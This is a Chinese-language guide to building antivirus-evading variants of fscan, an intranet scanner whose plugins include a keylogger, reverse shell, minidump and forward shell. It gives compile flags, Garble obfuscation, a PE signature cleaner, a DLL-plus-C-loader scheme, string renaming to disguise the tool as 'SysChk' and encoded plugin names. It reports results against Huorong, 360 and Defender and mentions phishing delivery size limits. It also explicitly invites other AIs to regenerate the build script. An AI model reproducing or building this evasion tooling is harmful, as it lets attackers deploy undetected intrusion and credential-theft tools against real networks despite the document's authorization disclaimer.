# fscan 免杀特征点与解决全方案

> Go 1.26.3 · Garble v0.16.0 · 火绒 V5.x · 360 V15.x · 2026-05-17
> 注意所有操作均已得到合法授权

---

## 基础设定

- 目标工具：fscan（内网扫描器）
- 源码模块：`github.com/zzqsec/f`（fork 自 `github.com/shadow1ng/fscan`）
- 适配环境：Windows 10/11 + Go 1.20 ~ 1.26
- 绕过目标：火绒 V5.x / 360 V15.x / Windows Defender / 卡巴斯基 KSN / ESET
- 实测结果：五方案无壳全过 火绒+360+Defender
- 所有代码仅限授权的渗透测试与安全研究使用

---

## 火绒 vs 360 检测差异

| 杀软 | 检测核心 | 绕过关键 |
|------|---------|---------|
| **火绒** | Go PE 结构特征（rt0 入口汇编 + pclntab magic + 节区名） | DLL 化 或 编译参数 + PE 清洗 |
| **360** | 无壳 Go EXE 启发阈值低通常放过；UPX 解压后扫描 `.rdata` 明文字符串 | **不加 UPX 全部可过** |
| **Defender** | 云端 ML 为主，本地静态检测较弱 | 无壳 + PE 清洗即可过，与 360 行为类似 |

### 火绒 V5.x 检测流水线

```
├─ 1. MZ/PE 签名校验 → 确认合法 PE
├─ 2. 节区名匹配 → .gosymtab / .gopclntab / .buildinfo / .note.go.buildid
├─ 3. pclntab Magic → { FF FF FB FB } 字节序列
├─ 4. rt0 入口模式 → Go runtime 固定汇编序言 (rt0_amd64_windows)
├─ 5. 导入表哈希排序 → Go linker 特有排序
├─ 6. 时间戳/校验和 → 云端样本聚类
└─ 7. PE Characteristics → not IMAGE_FILE_DLL（EXE 启发阈值更高）
```

### 360 V15.x 检测流水线

```
├─ 1. 无壳 Go EXE → 启发阈值较低，通常放过
├─ 2. UPX 壳 EXE → 解压后扫描 .rdata 明文字符串
├─ 3. 导入表协议指纹 → 多协议库同时导入触发
```

---

## 方案 A：编译参数 + PE 清洗

**定位：** EXE 基线方案，火绒/360 双过

| 项 | 内容 |
|-----|------|
| **原理** | 编译参数剥离 Go 节区/符号/BuildID → pe_cleaner.py 字节级清零 PE 指纹 |
| **产物** | `final_payload.exe`（~58MB）|
| **目录** | `Desktop/f-A/` |

**编译命令：**

```bash
cd f-A/

# 源码去特征
find . -type f -name "*.go" -exec sed -i 's|github.com/shadow1ng/fscan|github.com/zzqsec/f|g' {} +
sed -i 's|module github.com/shadow1ng/fscan|module github.com/zzqsec/f|' go.mod

# 编译
go build -trimpath \
    -ldflags="-s -w -buildid=" \
    -gcflags="all=-N -l" \
    -o raw.exe .

# PE 清洗
python pe_cleaner.py raw.exe final_payload.exe

# 验证
python verify_pe.py final_payload.exe
grep -abo "shadow1ng" final_payload.exe && echo "[!] 发现残留!" || echo "[+] 无残留"
grep -abo "go buildid" final_payload.exe && echo "[!] 发现残留!" || echo "[+] 无残留"
```

**对抗覆盖：**

| 火绒检测点 | 手段 | 结果 |
|-----------|------|:---:|
| `.gosymtab` / `.gopclntab` | `-s -w` 剥离 | ✅ |
| `.buildinfo` | `-s -w` 剥离 | ✅ |
| BuildID 聚类 | `-buildid=""` 清空 | ✅ |
| pclntab magic | pe_cleaner 清零 | ✅ |
| TimeDateStamp/CheckSum | pe_cleaner 清零 | ✅ |
| rt0 入口汇编 | ❌ 无对抗 | ⚠️ |
| 模块路径 `shadow1ng` | 全局替换为 `zzqsec` | ✅ |

> ⚠️ A 不含 rt0 入口对抗，火绒可能版本更新后命中。当前实测通过。

---

## 方案 B：Garble 混淆 + PE 清洗

**定位：** 最强 EXE 方案，覆盖火绒 PE 结构 + 360 字符串双重检测

| 项 | 内容 |
|-----|------|
| **原理** | Garble `-literals` AES 加密字符串字面量（插件名等）→ `-tiny` 剥离符号 → pe_cleaner 清零 PE 指纹 |
| **产物** | `final.exe`（~101MB）|
| **目录** | `Desktop/f-B/` |

**编译命令：**

```bash
cd f-B/

# 源码去特征（同 A）
find . -type f -name "*.go" -exec sed -i 's|github.com/shadow1ng/fscan|github.com/zzqsec/f|g' {} +

# Garble 混淆编译
garble -tiny -literals -seed=random build \
    -trimpath \
    -ldflags="-s -w -buildid=" \
    -o raw.exe .

# PE 清洗
python pe_cleaner.py raw.exe final.exe
```

**对抗覆盖：**

| 检测面 | 手段 | 结果 |
|--------|------|:---:|
| 火绒 节区名/pclntab/BuildID | `-s -w -buildid=""` + pe_cleaner | ✅ |
| 360 UPX 解压字符串 | Garble `-literals` AES 加密 `.rdata` 所有字面量 | ✅ |
| 360 插件名明文 | Garble 加密后不可读 | ✅ |
| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |

> Garble v0.16.0 实测兼容 Go 1.26.3，无需降级。

---

## 方案 C：c-shared DLL + C Loader

**定位：** **主战方案**，唯一绕过火绒 rt0 入口汇编检测，双杀核心

| 项 | 内容 |
|-----|------|
| **原理** | Go 编译为 `c-shared` DLL（入口 `DllMain` 标准 C 入口）→ C 编写轻量 loader 加载调用 |
| **产物** | `f-C_fscan.dll`（~49MB）+ `f-C_loader.exe`（~55KB）|
| **目录** | `Desktop/f-C/` |
| **参考** | fscan 1.8.4 DLL 化方案 |

**dll.go：**

```go
//go:build windows
package main

/*
#include <stdint.h>
*/
import "C"
import (
    "context"
    "os"
    "os/signal"
    "syscall"
    "unsafe"

    "github.com/zzqsec/f/common"
    "github.com/zzqsec/f/core"

    _ "github.com/zzqsec/f/plugins/local"
    _ "github.com/zzqsec/f/plugins/services"
    _ "github.com/zzqsec/f/plugins/web"
)

//export ExportScan
func ExportScan(argc C.int, argv **C.char) C.int {
    common.InitLogger()

    // C.char** → Go []string
    args := make([]string, 0, int(argc))
    ptr := uintptr(unsafe.Pointer(argv))
    for i := 0; i < int(argc); i++ {
        cstr := *(**C.char)(unsafe.Pointer(ptr + uintptr(i)*unsafe.Sizeof(argv)))
        args = append(args, C.GoString(cstr))
    }

    // 过滤掉 loader 自身
    if len(args) > 0 {
        args = args[1:]
    }

    var Info common.HostInfo
    if err := common.ParseWithArgs(&Info, args); err != nil {
        if err == common.ErrShowHelp { return 0 }
        return -1
    }

    if err := common.ValidateExclusiveParams(&Info); err != nil {
        common.LogError(err.Error()); return -3
    }

    if err := common.InitOutput(); err != nil {
        common.LogError(err.Error()); return -4
    }
    defer common.CloseOutput()

    result, err := common.Initialize(&Info)
    if err != nil {
        common.LogError(err.Error()); return -5
    }

    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()
    go func() { <-sigChan; cancel() }()

    defer func() { _ = common.Cleanup() }()
    defer common.CloseLogger()

    core.RunScan(ctx, *result.Info, result.Session)
    return 0
}

func main() {}
```

**common/flag.go 补充 ParseWithArgs：**

```go
// ParseWithArgs 使用自定义参数列表解析（DLL/c-archive 模式）
func ParseWithArgs(Info *HostInfo, args []string) error {
    if len(args) == 0 {
        return ErrShowHelp
    }
    oldArgs := os.Args
    os.Args = args
    defer func() { os.Args = oldArgs }()

    flag.CommandLine = flag.NewFlagSet(args[0], flag.ExitOnError)
    return Flag(Info)
}
```

**loader.c：**

```c
#include <windows.h>
#include <shellapi.h>

typedef int (__stdcall *ExportScanFunc)(int, char**);

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow) {
    /* 定位 DLL（与 loader 同目录） */
    char dllPath[MAX_PATH];
    GetModuleFileNameA(NULL, dllPath, MAX_PATH);
    char *lastSlash = strrchr(dllPath, '\\');
    if (lastSlash) *(lastSlash + 1) = '\0';
    strcat(dllPath, "f-C_fscan.dll");

    /* 加载 DLL */
    HMODULE hMod = LoadLibraryA(dllPath);
    if (!hMod) return 1;

    /* 获取导出函数 */
    ExportScanFunc ExportScan = (ExportScanFunc)GetProcAddress(hMod, "ExportScan");
    if (!ExportScan) { FreeLibrary(hMod); return 2; }

    /* 构建 argv */
    int argc;
    LPWSTR *wArgv = CommandLineToArgvW(GetCommandLineW(), &argc);
    char **argv = malloc(argc * sizeof(char*));
    for (int i = 0; i < argc; i++) {
        int len = WideCharToMultiByte(CP_UTF8, 0, wArgv[i], -1, NULL, 0, NULL, NULL);
        argv[i] = malloc(len);
        WideCharToMultiByte(CP_UTF8, 0, wArgv[i], -1, argv[i], len, NULL, NULL);
    }
    LocalFree(wArgv);

    /* 调用扫描 */
    int ret = ExportScan(argc, argv);

    /* 清理 */
    for (int i = 0; i < argc; i++) free(argv[i]);
    free(argv);
    FreeLibrary(hMod);
    return ret;
}
```

**编译：**

```bash
# Step 1: 编译 c-shared DLL
cd f-C/source
mv main.go _main.go.bak
CGO_ENABLED=1 go build -buildmode=c-shared -trimpath \
    -ldflags="-s -w -buildid=" \
    -o ../f-C_fscan.dll .
mv _main.go.bak main.go

# Step 2: 编译 C Loader
cd ..
gcc loader.c -o f-C_loader.exe -luser32 -lkernel32 -lshell32
```

**对抗覆盖：**

| 检测面 | 手段 | 结果 |
|--------|------|:---:|
| 火绒 rt0 入口汇编 | DLL 走 `DllMain` 标准 C 入口，不匹配 rt0 | ✅ |
| 火绒 节区名 | `-s -w` 剥离 | ✅ |
| 360 字符串 | 无壳，360 对无壳 Go 启发阈值低 | ✅ |
| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |
| C Loader 本体 | 55KB 纯 C，无 Go 残留 | ✅ |

---

## 方案 E：编译参数极限 + strip + PE 清洗

**定位：** EXE 稳定备选，不依赖外部 Go 工具，纯 Go + GCC + Python

| 项 | 内容 |
|-----|------|
| **原理** | 编译参数 + GCC strip 二次清理 + pe_cleaner 字节级清洗 |
| **产物** | `f-E_stripped.exe`（~56MB）|
| **目录** | `Desktop/f-E/` |

**迭代历史：**

```
c-archive（Go 1.26 runtime/cgo 缺失，blocked）
  → external linker（GCC 链接产 EXE，被杀）
    → go-strip v0.3.4（不兼容 Go 1.26 pclntab 格式，panic）
      → GCC strip -s + pe_cleaner ✅（最终方案）
```

> ⚠️ **两个 strip 的区别（容易混淆，留档备查）：**
>
> | 工具 | 来源 | 作用 | Go 1.26 |
> |------|------|------|:---:|
> | **go-strip** | `github.com/boy-hack/go-strip` | Go 专有：替换 pclntab magic、移除 Go 编译信息、添加混淆密钥 | ❌ panic |
> | **GCC strip** | MinGW `strip.exe`（`F:\CC\c\mingw64\bin\strip.exe`） | 通用：剥离符号表（.symtab）、调试信息，不碰 pclntab | ✅ 可用 |
>
> go-strip 的源码仓库已清空，v0.3.4 是最后的二进制版本，仅兼容 Go ≤1.18 左右的 pclntab 格式。Go 1.20+ pclntab 内部结构变动后 go-strip 无法定位 magic 字节。
> GCC strip 是通用 ELF/PE 工具，跟 Go 版本无关，`-s` 剥离所有符号。
> 当前方案用 GCC strip 做二次清理，pclntab 的破坏交给 pe_cleaner.py。

**编译命令：**

```bash
cd f-E/source/

# 编译（不用 external linker）
CGO_ENABLED=1 go build -trimpath \
    -ldflags="-s -w -buildid=" \
    -gcflags="all=-N -l" \
    -o ../output/raw.exe .

# GCC strip 二次清理
cd ../output
strip -s raw.exe -o stripped.exe

# PE 清洗
python pe_cleaner.py stripped.exe f-E_stripped.exe
```

**对抗覆盖：**

| 检测面 | 手段 | 结果 |
|--------|------|:---:|
| 火绒 节区名 | `-s -w` 剥离 | ✅ |
| pclntab magic | pe_cleaner 清零前 32 字节 | ✅ |
| BuildID | `-buildid=""` 清空 | ✅ |
| TimeDateStamp/CheckSum | pe_cleaner 清零 | ✅ |
| `.text` 段熵值 | `-gcflags="all=-N -l"` 改变布局 | ✅ |
| 模块路径 | `shadow1ng` → `zzqsec` | ✅ |

> 与 A 的关系：E = A + strip。strip 进一步清理 GCC 侧残留符号。

---

## 方案 F：源码字符串全量去特征 + 插件名混淆

**定位：** 源码字符串消除 + 插件名混淆，与 A 互补

| 项 | 内容 |
|-----|------|
| **原理** | 源码层消除所有 fscan 字面量 + 插件名 XOR/Base64 编码 → `.rdata` 不留明文特征 |
| **产物** | `final.exe`（~58MB）|
| **目录** | `Desktop/f-F/` |

**gen_plugins.py：**

```python
import random, base64

PLUGINS = ["ssh","smb","mysql","mssql","redis","ftp","rdp","ms17010",
    "netbios","vnc","telnet","postgresql","oracle","mongodb",
    "memcached","elasticsearch","ldap","kafka","rabbitmq",
    "cassandra","rsync","smtp","neo4j","activemq","findnet"]

xor_key = random.randint(1, 255)
encoded = [base64.b64encode(bytes(ord(c) ^ xor_key for c in n)).decode() for n in PLUGINS]

print(f"// XOR key: {xor_key}")
for orig, enc in zip(PLUGINS, encoded):
    print(f'  "{orig}" → decode("{enc}", {xor_key})')
```

**源码字符串替换：**

| 原文 | 替换为 |
|------|--------|
| `"fscan*.exe"` | 随机名 |
| `"Fscan 2.1.3"` | 去版本号 |
| `"fscan_results.json"` | 通用文件名 |
| `"FScan Forward Shell"` | 无特征名 |

**编译：** 同方案 A（编译参数 + PE 清洗），加源码字符串清理。

> 与 A 的关系：F = A + 源码字符串清理。无壳状态下火绒+360 双过。

---

## 方案全景对照（无 UPX）

```
           火绒rt0  火绒节区  360  Defender
C (DLL)      ✅       ✅      ✅     ✅
B (Garble)   ❌       ✅      ✅     ✅
A (编译)     ❌       ✅      ✅     ✅
E (strip)    ❌       ✅      ✅     ✅
F (源码)     ❌       ✅      ✅     ✅
```

> 五方案无壳全过 火绒+360+Defender。一加 UPX 360 全部查杀。**

## 推荐使用

| 场景 | 方案 | 理由 |
|------|------|------|
| **默认首选** | **C** | 唯一绕过火绒 rt0 入口检测 |
| **单 EXE 最强** | **B** | Garble `.rdata` AES 加密 |
| **快速出活** | **脚本 `bash build_fscan_evasion.sh`** | 一键 A+F 并行编译，Go 原生 pe_cleaner，无需 Python |
| **体积限制** | 不加 UPX | 无壳全过，加壳 360 必杀 |

---

## 坑点记录

### 坑1：`-buildid=""` 空值引号不可省略

错误写法：`-ldflags="-s -w -buildid"` — 没有等号后的值，BuildID 不会被清空。
修复：必须写 `-ldflags="-s -w -buildid="`，等号后紧跟结束引号，表空字符串。

### 坑2：`-s -w` 不是银弹，pclntab magic 仍在

`-s -w` 剥离节区名但 `.rdata`/`.text` 中 pclntab magic `FF FF FB FB` 和 rt0 入口模式仍嵌入。需 pe_cleaner.py 字节级清零。

### 坑3：UPX 是最大的坑 — 无壳全过，一加 UPX 360 全部查杀

实测结论：五个方案（A/B/C/E/F）无壳状态下火绒+360 全部通过。一旦加 UPX 压缩，360 解压后扫描 `.rdata` 明文字符串，**全部被杀**。

对策：**没有上传体积限制就不要加 UPX。** 当前方案体积 49~101MB，高于几个常见钓鱼/传文件场景的限制时再考虑压缩，但预期 360 必杀。

### 坑4：go-strip ≠ GCC strip（见方案 E 迭代历史中的对比表）

go-strip（boy-hack/go-strip）是 Go 专有混淆工具，v0.3.4 不兼容 Go 1.26 pclntab 格式，直接 panic。GCC strip（MinGW 自带）是通用符号剥离工具，与 Go 版本无关，当前方案用的是后者。

### 坑5：Garble 官方文档称不兼容 Go 1.26，实测可用

Garble v0.16.0 官方声明支持 Go ≤1.24，但实测 Go 1.26.3 可正常编译。可能后续版本修复，需持续关注。

### 坑6：c-archive `runtime/cgo` 缺失

Go 1.26 Windows `go build -buildmode=c-archive` 报 `loadinternal: cannot find runtime/cgo`。`go list runtime/cgo` 显示包存在但缺少预编译 `.a` 文件。Go ≤1.24 可用。

### 坑7：DLL 能过火绒 ≠ 火绒不扫描 DLL

火绒扫描所有 PE 文件。Go EXE `rt0_amd64_windows` 入口触发高启发评分；DLL 入口是 `DllMain`，不匹配该模式，PE 结构评分更低。

### 坑8：`rt0_jump { E8 ?? ?? ?? ?? 48 C7 C0 }` 是虚构特征

此字节序列未出现在火绒 YARA 规则中，是 x86-64 通用指令，不构成 Go 独有特征。

### 坑9：`runtime.` 字符串数量不是火绒检测核心

N1 PRO FLASH 火绒 YARA 不含 `runtime.` 字符串匹配。DLL 中 `runtime.` 比 EXE 还多却不会被杀，进一步证明。

### 坑10：方案间产物存在冗余关系

A 被 E 覆盖（E = A + strip），F 与 A 仅在源码字符串层面差异。各方案独立保留因对抗面不同。

### 坑11：`//go:embed` 嵌入资源必须纳入替换

`webscan/web_scan.go` 嵌入 `pocs/` 目录（`//go:embed pocs`），`web/server.go` 嵌入 `dist/*`。YAML/JS 文件中的 `shadow1ng/fscan` 会随 embed 编译进 `.rdata`。对策：预扫描所有 `//go:embed` 路径 → 编译前对嵌入的非 .go 文件同样做 `shadow1ng→zzqsec` 替换。**忽略此坑 = 编译完发现残留 → 反复编译（+15min）**。

### 坑12：pe_cleaner 可从 Python/pefile 迁移到 Go 原生

`debug/pe` + `encoding/binary` 即可实现 PE 节区头定位、TimeDateStamp/CheckSum 清零、节区改名，零外部依赖。自动构建脚本 `build_fscan_evasion.sh` 内嵌了 Go 版 pe_cleaner，编译过程无需 `pip install pefile`。

---

## 一键构建脚本（其他 AI 可据此自行生成）

### 脚本架构（6 步流水线）

```
check_env → scan_embed_paths → apply_replacements → [obfuscate_plugins] → build_pecleaner → compile_and_clean
                                                                           ↑ 仅 F              ↑ 并行 A+F
```

### 核心组件 1：Go 原生 PE 清洗器

文件 `pe_cleaner.go`，加 `//go:build ignore` 标签。`GO111MODULE=off` 在独立 temp dir 编译，避免与主模块冲突。

PE 头解析链及关键偏移：

```
data[0x3C:0x40]  → e_lfanew (DWORD LE)           // DOS 头
e_lfanew+4        → "PE\x00\x00" 签名
coffOff = e_lfanew+4
  +2              → NumberOfSections (WORD)
  +4              → TimeDateStamp (DWORD) → 清零
  +16             → SizeOfOptionalHeader (WORD)
optOff = coffOff + 20
  +64             → CheckSum (DWORD) → 清零       // PE32/PE32+ 同偏移
secHdrOff = optOff + SizeOfOptionalHeader
  每 40 字节一个 Section Header:
    +0  (8B)      → Name[8]
    +16 (4B)      → SizeOfRawData
    +20 (4B)      → PointerToRawData
```

节区操作映射：

| 原节区名 | 清零范围 | 重命名为 |
|---------|---------|---------|
| `.gosymtab` | 前 16 字节 | `.text` |
| `.gopclntab` | 前 32 字节 | `.rdata` |
| `.buildinfo` | 全部清零 | `.data` |
| `.note.go.buildid` | 全部清零 | `.reloc` |

额外：字节扫描整个 PE，找到 `go buildid ` 标记全部 `\x00` 覆盖。

### 核心组件 2：`//go:embed` 路径扫描

```bash
grep -rn "//go:embed" "$dir" --include="*.go" | while read line; do
    pattern=$(echo "$line" | grep -oP '//go:embed\s+\K\S+')
    # 展开 glob，收集所有嵌入文件路径
done
```

关键嵌入点：`webscan/web_scan.go` → `pocs/`（YAML）、`web/server.go` → `dist/*`（JS）

### 核心组件 3：Scheme F 字符串替换表

| 文件 | 原文 | 替换为 |
|------|------|--------|
| `common/flag.go` | `Fscan %s (%s %s)` | `SysChk %s (%s %s)` |
| `common/flag.go` | `Fscan %s` | `SysChk %s` |
| `common/logger.go` | `fscan_debug.log` | `debug_trace.log` |
| `plugins/local/forwardshell.go` | `FScan Forward Shell` | `Remote Shell` |
| `plugins/local/cleaner.go` | `fscan*.exe` 等 7 处 | `syschk*` 对应替换 |
| `web/api/result.go` | `fscan_results.json/csv` | `scan_export.json/csv` |
| `webscan/lib/poc_adapter.go` | `"fscan"` | `"native"` |
| `core/web_scanner.go` | `fscan-web-detector/2.1` | `NetScanner/2.1` |
| `plugins/services/smtp.go` | `fscan.test` | `localhost.local` |

### 核心组件 4：XOR+Base64 插件名混淆表（`key=164`）

`common/obfuscate.go` 内嵌 `func Decode(encoded string, key byte) string`，XOR 解码 + Base64 解码。

sed 替换模式（5 种注册函数均需覆盖）：
```bash
s|NewBasePlugin("$name")|NewBasePlugin(common.Decode("$encoded", 164))|g
s|RegisterPluginWithPorts("$name",|RegisterPluginWithPorts(common.Decode("$encoded", 164),|g
s|RegisterLocalPlugin("$name",|RegisterLocalPlugin(common.Decode("$encoded", 164),|g
s|RegisterWebPlugin("$name",|RegisterWebPlugin(common.Decode("$encoded", 164),|g
s|RegisterPlugin("$name",|RegisterPlugin(common.Decode("$encoded", 164),|g
```

25 个 service 插件映射：

| 原名 | 编码值 | 原名 | 编码值 |
|------|--------|------|--------|
| ssh | `19fM` | smb | `18nG` |
| mysql | `yd3X1cg=` | mssql | `ydfX1cg=` |
| redis | `1sHAzdc=` | ftp | `wtDU` |
| rdp | `1sDU` | ms17010 | `ydeVk5SVlA==` |
| netbios | `ysHQxs3L1w==` | vnc | `0srH` |
| telnet | `0MHIysHQ` | postgresql | `1MvX0MPWwdfVyA==` |
| oracle | `y9bFx8jB` | mongodb | `ycvKw8vAxg==` |
| memcached | `ycHJx8XHzMHA` | elasticsearch | `wcjF19DNx9fBxdbHzA==` |
| ldap | `yMDF1A==` | kafka | `z8XCz8U=` |
| rabbitmq | `1sXGxs3QydU=` | cassandra | `x8XX18XKwNbF` |
| rsync | `1tfdysc=` | smtp | `18nQ1A==` |
| neo4j | `ysHLkM4=` | activemq | `xcfQzdLBydU=` |
| findnet | `ws3KwMrB0A==` |

21 个 local 插件映射：

| 原名 | 编码值 | 原名 | 编码值 |
|------|--------|------|--------|
| cleaner | `x8jBxcrB1g==` | forwardshell | `wsvW08XWwNfMwcjI` |
| crontask | `x9bLytDF188=` | envinfo | `wcrSzcrCyw==` |
| dcinfo | `wMfNysLL` | fileinfo | `ws3Iwc3Kwss=` |
| ldpreload | `yMDU1sHIy8XA` | downloader | `wMvTysjLxcDB1g==` |
| keylogger | `z8HdyMvDw8HW` | reverseshell | `1sHSwdbXwdfMwcjI` |
| avdetect | `xdLAwdDBx9A=` | systemdservice | `193X0MHJwNfB1tLNx8E=` |
| minidump | `yc3KzcDRydQ=` | shellenv | `18zByMjBytI=` |
| socks5proxy | `18vHz9eR1NbL3N0=` | systeminfo | `193X0MHJzcrCyw==` |
| winschtask | `083K18fM0MXXzw==` | winregistry | `083K1sHDzdfQ1t0=` |
| winservice | `083K18HW0s3HwQ==` | winstartup | `083K19DF1tDR1A==` |
| winwmi | `083K08nN` | | |

2 个 web 插件：`webtitle`→`08HG0M3QyME=`、`webpoc`→`08HG1MvH`

### 核心组件 5：并行编译

```bash
build_A & pid_a=$!
build_F & pid_f=$!
wait $pid_a; wait $pid_f
```

每个方案独立：复制源码目录 → 替换 → [混淆] → 编译 pe_cleaner → go build → PE 清洗 → 验证。

### 用法

```bash
bash Desktop/build_fscan_evasion.sh        # 全部方案（并行）
bash Desktop/build_fscan_evasion.sh A      # 仅方案 A
bash Desktop/build_fscan_evasion.sh F      # 仅方案 F
```

前提：仅需 Go 1.20+，无 Python 依赖。预计 8-10 分钟全量构建。

---

## PE 清洗四步流程

| 步骤 | 操作 | 对抗目标 |
|------|------|---------|
| 清零节区数据 | `.gopclntab` 前 32B / `.buildinfo` 全清 / `.gosymtab` 前 16B → `\x00` | pclntab magic `FF FF FB FB` |
| 重命名节区 | `.gosymtab→.text` `.gopclntab→.rdata` `.buildinfo→.data` `.note.go.buildid→.reloc` | 节区名启发式 |
| 清零 PE 头 | TimeDateStamp=0 / CheckSum=0 / 字节级清除 `go buildid ` 标记 | 云端聚类 |
| 写回 | 保存修改后 PE | — |

> pe_cleaner 实现见 `build_fscan_evasion.sh` 内嵌的 Go 版（零依赖），或 `pe_cleaner.py`（需 `pip install pefile`）。

---

## 核心约束（所有方案必须遵守）

- 全局替换 `github.com/shadow1ng` → `github.com/zzqsec`（含 embed 的非 .go 文件）
- `-ldflags="-s -w -buildid="` + `-trimpath`
- PE 后处理清零 TimeDateStamp + CheckSum + `go buildid ` 标记
- **不加 UPX**（360 解压扫 `.rdata` 全杀）

## 二进制验证

```bash
grep -abo "shadow1ng" final.exe    # 应为空
grep -abo "go buildid" final.exe   # 应为空
grep -abo "fscan" final.exe        # 方案 F 应为空（Go stdlib fmt.Fscan 除外）
```
